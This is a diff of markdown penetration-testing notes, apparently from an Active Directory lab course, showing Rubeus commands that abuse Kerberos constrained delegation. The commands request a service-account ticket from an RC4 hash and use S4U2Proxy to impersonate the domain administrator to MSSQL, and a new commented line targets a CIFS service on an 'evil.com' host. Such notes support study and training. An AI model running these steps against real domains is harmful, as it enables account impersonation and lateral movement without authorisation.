@@ -157,11 +157,13 @@ nslookup appsrv01
     # Generate the NTLM hash
     .\Rubeus.exe hash /password:lab
     # Generate TGT for IISSvc
-    .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+    .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
     ```
 * Use S4U2Proxy to get a ticket to MSSQL (SPN listed in msds-allowedtodelegateto field)
   * ```powershell
     .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+
+    # .\Rubeus.exe s4u /ticket:doIEpjCCBKKgA… /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt
     ```
 *   Execute code on MSSQL
 
